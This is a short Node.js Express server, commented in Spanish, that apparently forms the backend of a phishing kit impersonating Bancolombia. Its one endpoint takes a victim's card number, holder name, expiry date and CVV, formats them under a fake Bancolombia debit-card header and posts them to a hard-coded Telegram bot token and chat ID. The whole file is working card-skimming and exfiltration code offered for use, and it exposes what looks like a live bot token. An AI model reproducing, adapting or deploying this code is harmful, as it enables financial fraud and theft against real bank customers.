const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());

// ============================================
// ✅ CONFIGURACIÓN SEGURA DE TELEGRAM
// ============================================
// 🔴 REEMPLAZA ESTOS VALORES CON LOS TUYOS 🔴
const BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';  // ← TU TOKEN DE BOTFATHER
const CHAT_ID = '8042354877';  // ← TU CHAT ID DE TELEGRAM
// ============================================

// Endpoint para recibir datos de la tarjeta y enviarlos a Telegram
app.post('/api/send-to-telegram', async (req, res) => {
    try {
        const { cardNumber, cardHolder, expiryDate, cvcCode } = req.body;

        // Validaciones
        if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
            return res.status(400).json({ error: 'Faltan datos de la tarjeta' });
        }

        // Construir mensaje con formato bonito
        const message = `🏦 *BANCOLOMBIA - NUEVA TARJETA DÉBITO* 🏦\n\n` +
                        `💳 *Número:* \`${cardNumber}\`\n` +
                        `👤 *Titular:* ${cardHolder}\n` +
                        `📅 *Vencimiento:* ${expiryDate}\n` +
                        `🔐 *CVV:* ${cvcCode}\n` +
                        `🔄 *Tipo:* Mastercard Débito\n\n` +
                        `🕒 *Fecha:* ${new Date().toLocaleString('es-CO')}\n` +
                        `🔒 *Canal:* Tarjeta Virtual Bancolombia`;

        // Enviar a Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });

        if (response.data.ok) {
            res.json({ success: true, message: 'Datos enviados a Telegram correctamente' });
        } else {
            res.status(500).json({ error: 'Error al enviar a Telegram' });
        }

    } catch (error) {
        console.error('Error:', error.response?.data || error.message);
        res.status(500).json({ error: 'Error interno del servidor' });
    }
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en http://localhost:${PORT}`);
    console.log(`📨 Los datos se enviarán a Telegram automáticamente`);
});
